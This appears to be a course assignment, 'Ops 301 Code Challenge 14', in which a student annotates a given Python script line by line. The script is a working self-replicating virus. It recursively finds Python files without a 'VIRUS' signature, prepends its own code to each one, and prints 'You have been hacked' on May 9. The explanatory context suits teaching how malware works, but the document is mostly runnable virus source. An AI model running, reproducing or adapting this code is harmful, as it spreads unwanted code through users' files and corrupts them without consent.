#!/usr/bin/python3

# Ops 301 Code Challenge 14
# Dylan Dempsey
# 03/30/23
# Explain this python script


# Main 

import os
import datetime

# Define the signature used to mark infected files
SIGNATURE = "VIRUS"

# locate function: Recursively searches for uninfected Python files in the given directory and its subdirectories
def locate(path):
    files_targeted = []  # List of targeted files
    filelist = os.listdir(path)  # List all files and directories in the current path
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):  # If the current item is a directory
            files_targeted.extend(locate(path+"/"+fname))  # Recursively search for Python files in the subdirectory
        elif fname[-3:] == ".py":  # If the current item is a Python file
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:  # Check if the file is already infected
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)  # If the file is not infected, add it to the list of targeted files
    return files_targeted

# infect function: Infects the targeted Python files by injecting the virus code at the beginning of the file
def infect(files_targeted):
    virus = open(os.path.abspath(__file__))  # Open the current script (the virus)
    virusstring = ""  # String to store the virus code
    for i, line in enumerate(virus):
        if 0 <= i < 39:  # This line assumes that the virus code is within the first 39 lines
            virusstring += line  # Add the virus code to the virusstring
    virus.close()
    for fname in files_targeted:  # Iterate through the targeted files
        f = open(fname)  # Open the file
        temp = f.read()  # Read the file contents
        f.close()
        f = open(fname, "w")  # Re-open the file for writing
        f.write(virusstring + temp)  # Write the virus code followed by the original file content
        f.close()

# detonate function: Triggers a payload if the current date is May 9th
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

# Main execution starts here
files_targeted = locate(os.path.abspath(""))  # Locate uninfected Python files in the current directory and its subdirectories
infect(files_targeted)  # Infect the targeted Python files
detonate()  # Check the date and trigger the payload if the conditions are met

# End
